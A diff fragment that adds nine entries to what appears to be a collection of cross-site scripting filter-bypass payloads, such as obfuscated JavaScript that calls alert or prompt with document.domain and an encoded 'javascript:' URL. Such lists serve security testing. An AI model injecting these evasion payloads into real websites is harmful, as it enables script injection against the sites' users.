@@ -237,3 +237,12 @@ f=(x=alert(1))=>{};f();
 x=(lol=alert(1),x=class x extends x{constructor(){alert(1)}}()()()()())=>class x extends x{}()()();x()
 \'-a\u{6c}e\u{72}t(1))%0a-->
 eval(`ale${[[[[]=[]]=[[]=[]]]=[[]=[]]]=[]}rt(1)`);
+alert(1,)//
+var{x:y,}=1
+{}let{}={}
+var{x:x,x=alert(1)}=1;
+function xss(why,){}//
+Set.constructor`alert\x28document.domain\x29```
+o={1.e+1111(){alert(arguments.callee);}};o[1e1111]()//
+prompt`${document.domain}`
+javascr%0d%0aipt%3Aalert.call(this,%20document.domain)
